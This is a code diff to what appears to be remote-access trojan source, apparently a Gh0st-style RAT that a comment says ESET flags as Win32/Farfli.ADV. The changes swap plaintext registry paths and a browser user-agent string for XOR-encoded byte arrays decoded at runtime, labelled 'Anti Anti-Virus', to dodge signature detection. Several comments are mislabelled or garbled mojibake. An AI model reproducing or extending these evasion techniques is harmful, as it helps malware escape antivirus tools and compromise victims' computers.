@@ -98,7 +98,17 @@ bool getLoginInfo(char *lpURL, char **lppszHost, LPDWORD lppPort, char **lppszPr
 
 	HINTERNET	hNet;
 	HINTERNET	hFile;
-	hNet = InternetOpen("Mozilla/4.0 (compatible)", INTERNET_OPEN_TYPE_PRECONFIG, NULL, INTERNET_INVALID_PORT_NUMBER, 0);
+
+	//strcry
+	char Mozilla[] = { 0x18,0x86,0xa5,0xb3,0xa1,0xab,0xaa,0xa4,0xeb,0xf7,0xec,0xf1,0xe0,0x97,0xdd,0xd2,0xd1,0xcb,0xdb,0xcd,0xd1,0xd5,0xda,0xd0,0x9d };	//Mozilla/4.0 (compatible)
+	char* pMozilla = decodeStr(Mozilla);					//½âÃÜº¯Êý
+
+	hNet = InternetOpen(pMozilla, INTERNET_OPEN_TYPE_PRECONFIG, NULL, INTERNET_INVALID_PORT_NUMBER, 0);
+
+	memset(pMozilla, 0, pMozilla[STR_CRY_LENGTH]);					//Ìî³ä0
+	delete pMozilla;
+
+
 	if (hNet == NULL)
 		return bRet;
 	hFile = InternetOpenUrl(hNet, lpURL, NULL, 0, INTERNET_FLAG_PRAGMA_NOCACHE | INTERNET_FLAG_RELOAD, 0);
@@ -139,9 +149,26 @@ DWORD CPUClockMhz()
 	DWORD	dwCPUMhz;
 	DWORD	dwBytes = sizeof(DWORD);
 	DWORD	dwType = REG_DWORD;
-	RegOpenKey(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0", &hKey);
+
+	//HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0
+	//Anti Anti- Virus eset : a variant of Win32/Farfli.ADV trojan 
+	char HARDWARE[] = { 0x2e,0x83,0x8b,0x9b,0x8c,0x90,0x87,
+		0x97,0x81,0x9f,0x86,0x84,0x93,0xfc,0xec,0xf4,0xec,
+		0xef,0xf3,0xf6,0xf6,0xeb,0xe5,0xcc,0xc7,0xc7,0xd7,
+		0xdc,0xec,0xec,0xcb,0xc3,0xd8,0xd9,0xcb,0xc5,0xf8,
+		0xd5,0xc9,0xc6,0xc1,0xd0,0xd1,0xce,0xd2,0xc3,0xae
+	};	//WinSta0\Default
+	char* pHARDWARE = decodeStr(HARDWARE);  //½âÃÜº¯Êý
+
+	RegOpenKey(HKEY_LOCAL_MACHINE, pHARDWARE, &hKey);
 	RegQueryValueEx(hKey, "~MHz", NULL, &dwType, (PBYTE)&dwCPUMhz, &dwBytes);
+
 	RegCloseKey(hKey);
+
+	memset(pHARDWARE, 0, HARDWARE[STR_CRY_LENGTH]);					//Ìî³ä0
+	delete pHARDWARE;
+
+
 	return	dwCPUMhz;
 }
 
@@ -163,11 +190,25 @@ UINT GetHostRemark(LPCTSTR lpServiceName, LPTSTR lpBuffer, UINT uSize)
 	char	strSubKey[1024];
 	memset(lpBuffer, 0, uSize);
 	memset(strSubKey, 0, sizeof(strSubKey));
-	wsprintf(strSubKey, "SYSTEM\\CurrentControlSet\\Services\\%s", lpServiceName);
+
+	//strcry SYSTEM\CurrentControlSet\Services\%s
+	char Services[] = { 0x24,0x98,0x93,0x9a,0x9c,0x82,0x8b,
+		0x99,0x87,0xb6,0xb0,0xb3,0xa5,0xd1,0xca,0xfe,0xd3,
+		0xd5,0xce,0xcb,0xd7,0xdb,0xe5,0xd0,0xc0,0xef,0xe1,
+		0xd4,0xc2,0xd9,0xc7,0xce,0xc9,0xd8,0xf6,0x8c,0xdb };	//WinSta0\Default
+	char* pServices = decodeStr(Services);							//½âÃÜº¯Êý
+
+	//wsprintf(strSubKey, "SYSTEM\CurrentControlSet\Services\%s", lpServiceName);
+	
+	wsprintf(strSubKey, pServices, lpServiceName);
 	ReadRegEx(HKEY_LOCAL_MACHINE, strSubKey, "Host", REG_SZ, (char *)lpBuffer, NULL, uSize, 0);
 
 	if (lstrlen(lpBuffer) == 0)
 		gethostname(lpBuffer, uSize);
+
+	memset(strSubKey, 0, sizeof(strSubKey));
+	memset(pServices, 0, Services[STR_CRY_LENGTH]);					//Ìî³ä0
+	delete pServices;
 
 	return lstrlen(lpBuffer);
 }
